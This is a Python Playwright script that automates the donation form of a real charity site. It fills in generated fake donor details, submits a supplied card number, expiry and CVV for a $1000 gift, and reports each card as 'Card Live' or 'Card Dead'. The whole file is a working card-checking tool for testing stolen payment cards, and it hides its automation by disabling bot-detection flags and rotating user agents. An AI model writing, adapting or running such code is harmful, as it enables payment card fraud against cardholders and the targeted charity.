import asyncio
import random
from playwright.async_api import async_playwright
from utils.helpers import random_donor

async def authorize_check(card, month, year, cvv, retries=2):
    for attempt in range(retries + 1):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--no-sandbox',
                        '--disable-web-security',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-gpu'
                    ]
                )
                context = await browser.new_context(
                    user_agent=random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ]),
                    viewport={'width': 1366, 'height': 768}
                )
                page = await context.new_page()
                page.set_default_timeout(45000)
                await page.goto("https://giving.mclean.org/#gf_18", wait_until='domcontentloaded', timeout=45000)
                await page.wait_for_selector("input[id*='input_18']", timeout=30000)
                # Amount
                if await page.locator("input[name='input_18_1'][value='1000']").count() > 0:
                    await page.click("input[name='input_18_1'][value='1000']")
                else:
                    await page.click("text=$1000")
                # Designation
                await page.select_option("select#input_18_2", label="The McLean Fund")
                donor = random_donor()
                await page.fill("input#input_18_3_3", donor["first"])
                await page.fill("input#input_18_3_6", donor["last"])
                await page.fill("input#input_18_4", donor["email"])
                await page.select_option("select#input_18_5_1", label="United States")
                await page.fill("input#input_18_5_4", donor["address"])
                await page.fill("input#input_18_5_5", donor["city"])
                await page.select_option("select#input_18_5_6", label=donor["state"])
                await page.fill("input#input_18_5_7", donor["zip"])
                await page.fill("input#input_18_37_1", card)
                await page.fill("input#input_18_37_2", f"{month}/{year}")
                await page.fill("input#input_18_37_3", cvv)
                async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=30000) as resp:
                    await page.click("input#gform_submit_button_18")
                response = await resp.value
                body = await response.text()
                await context.close()
                await browser.close()
                if "approved" in body.lower() or "success" in body.lower():
                    return ("✅ APPROVED", "Card Live", True)
                elif "do not honor" in body.lower() or "declined" in body.lower():
                    return ("❌ DECLINED", "Card Dead", False)
                else:
                    return ("⚠️ UNKNOWN", body[:100], None)
        except Exception as e:
            if attempt < retries:
                await asyncio.sleep(2)
                continue
            else:
                return ("❌ ERROR", f"Attempt {attempt+1} failed: {str(e)[:100]}", None)
    return ("❌ ERROR", "All retries failed", None)